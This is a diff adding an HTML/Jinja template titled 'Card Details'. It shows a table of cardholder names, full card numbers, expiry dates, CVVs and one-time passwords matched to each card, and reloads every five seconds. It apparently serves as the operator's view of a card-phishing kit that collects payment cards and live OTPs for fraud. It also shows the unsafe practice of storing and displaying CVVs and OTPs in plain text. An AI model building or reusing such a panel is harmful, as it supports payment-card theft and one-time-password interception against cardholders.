@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Details</title>
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th,
+        td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .green {
+            color: green;
+            font-weight: 900;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>Card Details</h2>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Id</th>
+                <th>Name</th>
+                <th>Card Number</th>
+                <th>Expiry Month</th>
+                <th>Expiry Year</th>
+                <th>CVV</th>
+                <th>Card Type</th>
+                <th>OTP</th>
+            </tr>
+        </thead>
+
+        <tbody>
+            {% for card_detail in card_details %}
+            <tr>
+                <td>{{ card_detail.card_id }}</td>
+                <td>{{ card_detail.name }}</td>
+                <td>{{ card_detail.card_number }}</td>
+                <td>{{ card_detail.exp_month }}</td>
+                <td>{{ card_detail.exp_year }}</td>
+                <td>{{ card_detail.cvv }}</td>
+                {% if card_detail.card_type == 'credit-card' %}
+                <td class="green">{{ card_detail.card_type }}</td>
+                {% else %}
+                <td>{{ card_detail.card_type }}</td>
+                {% endif %}
+                <td>
+                    {% for otp in otps %}
+                    {% if otp.card_details.card_id == card_detail.card_id %}
+                    <br>
+                    {{ otp.otp }}
+                    {% endif %}
+                    {% endfor %}
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+
+    <script>
+        setTimeout(() => {
+            window.location.reload()
+        }, 5000);
+    </script>
+
+
+</body>
+
+</html>
